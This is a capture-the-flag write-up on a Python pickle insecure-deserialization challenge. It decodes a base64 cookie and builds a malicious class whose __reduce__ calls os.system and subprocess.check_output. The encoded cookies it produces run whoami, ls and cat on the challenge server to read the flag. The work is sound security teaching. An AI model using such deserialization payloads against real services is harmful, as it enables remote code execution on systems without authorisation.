## Analysis

![](../../.gitbook/assets/image%20%2831%29.png)

All the references to **pickles** implies it's an **insecure deserialization** challenge. [`pickle`](https://docs.python.org/3/library/pickle.html) is a serialization format used in python.

If we check the cookies, we get the following:

```text
plan_b=KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu
```

Our guess is that this is a pickled python object, and decoding the base64 seems to imply that to us too:

```text
$ echo 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu' | base64 -d

```

## Unpickling

Let's immediately try to unpickle the data, which should give us a feel for how data is parsed:

```python
from base64 import b64decode

import pickle

code = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'

serum = pickle.loads(b64decode(code))
print(serum)
```

```text
$ python3 deserialize.py 
Traceback (most recent call last):
  File "deserialize.py", line 7, in <module>
    serum = pickle.loads(b64decode(code))
AttributeError: Can't get attribute 'anti_pickle_serum' on <module '__main__' from 'deserialize.py'>
```

The error is quite clear - there's no `anti_pickle_serum` variable. Let's add one in and try again.

```python
code = b'KGRwMApT[...]'
anti_pickle_serum = 'test'
```

That error is fixed, but there's another one:

```text
$ python3 deserialize.py 
Traceback (most recent call last):
  File "deserialize.py", line 8, in <module>
    serum = pickle.loads(b64decode(code))
  File "/usr/lib/python3.8/copyreg.py", line 43, in _reconstructor
    obj = object.__new__(cls)
TypeError: object.__new__(X): X is not a type object (str)
```

Here it's throwing an error because X \(`anti_pickle_serum`\) **is not a type object** - so let's make it a class extending from `object`!

```python
# [imports]
class anti_pickle_serum(object):
    def __init__(self):
        pass
# [...]
```

And now there's no error, and we get a response!

```text
$ python3 deserialize.py 
{'serum': <__main__.anti_pickle_serum object at 0x7f9e1a1b1c40>}
```

So the cookie is the pickled form of a dictionary with the key `serum` and the value of an `anti_pickle_serum` class! Awesome.

## Exploitation

For an introduction to pickle exploitation, I highly recommend [this blog post](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). Essentially, the `__reduce__` dunder method tells pickle how to deserialize, and to do so it takes a **function** and a **list of parameters**. We can set the function to `os.system` and the parameters to the code to execute!

```python
from base64 import b64encode

import pickle
import os

class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
        return os.system, (['whoami'],)

code = pickle.dumps({'serum': anti_pickle_serum()})
code = b64encode(code)
print(code)
```

Here we create the malicious class, then serialize it as part of the dictionary as we saw before.

```text
$ python3 final.py 
b'gASVLAAAAAAAAAB9lIwFc2VydW2UjAVwb3NpeJSMBnN5c3RlbZSTlIwGd2hvYW1plIWUUpRzLg=='
```

Huh, that looks nothing like the original cookie value \(which starts with `KGRwMApTJ3`\)... maybe we missed something with the `dumps`?

Checking out the [`dumps()`](https://docs.python.org/3/library/pickle.html#pickle.dumps) documentation, there is a `protocol` parameter! If we [read a bit deeper](https://docs.python.org/3/library/pickle.html#data-stream-format), this can take a value from `0` to `5`. If we play around, `protocol=0` looks similar to the original cookie:

```python
code = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
```

```text
$ python3 final.py 
b'KGRwMApWc2VydW0KcDEKY3Bvc2l4CnN5c3RlbQpwMgooVndob2FtaQpwMwp0cDQKUnA1CnMu'
```

Let's change the cookie to this \(without the `b''`\):

![](../../.gitbook/assets/image%20%2834%29.png)

As you can see now, the value `0` was returned. This is the return value of `os.system`! Now we simply need to find a function that returns the result, and we'll use `subprocess.check_output` for that.

{% hint style="danger" %}
For reasons unknown to me, python3 pickles this differently to python2 and doesn't work. I'll therefore be using python2 from now on, but if anybody know why that would happen, please let me know!
{% endhint %}

```python
return subprocess.check_output, (['ls'],)
```

Now run it

```text
$ python final.py 
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydscycKcDQKYXRwNQpScDYKcy4=
```

And input it as the cookie.

![](../../.gitbook/assets/image%20%2833%29.png)

As can now see that there is a `flag_wIp1b` file, so we can just read it!

While it's tempting to do

```python
return subprocess.check_output, (['cat flag_wIp1b'],)
```

`subprocess.check_output` requires a **list** of parameters \(as we see here\) and the filename is a separate item in the list, like so:

```python
return subprocess.check_output, (['cat', 'flag_wIp1b'],)
```

```text
$ python final.py 
KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJ2ZsYWdfd0lwMWInCnA1CmF0cDYKUnA3CnMu
```

And boom - we get the flag!
